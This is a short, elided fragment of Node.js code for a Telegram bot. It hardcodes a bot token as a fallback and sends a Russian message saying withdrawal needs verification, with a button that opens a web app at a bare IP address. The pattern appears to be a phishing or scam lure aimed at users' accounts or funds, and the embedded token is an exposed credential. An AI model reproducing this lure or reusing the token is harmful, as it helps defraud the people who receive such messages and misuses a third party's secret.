...
const BOT_TOKEN = process.env.BOT_TOKEN || '8319103126:AAHjOz5Gx6gT_03gp8M9aS6QmiaLPE9cmGo';
...
const WEB_APP_URL = 'http://216.146.25.74:3000'; // ОБНОВЛЕННЫЙ URL
            ...
            bot.sendMessage(
                ...
                `🔐 <b>Для вывода требуется верификация</b>`,
                {
                    ...
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Пройти верификацию", web_app: { url: "216.146.25.74"  } }
                            ]
                        ]
                    }
                }
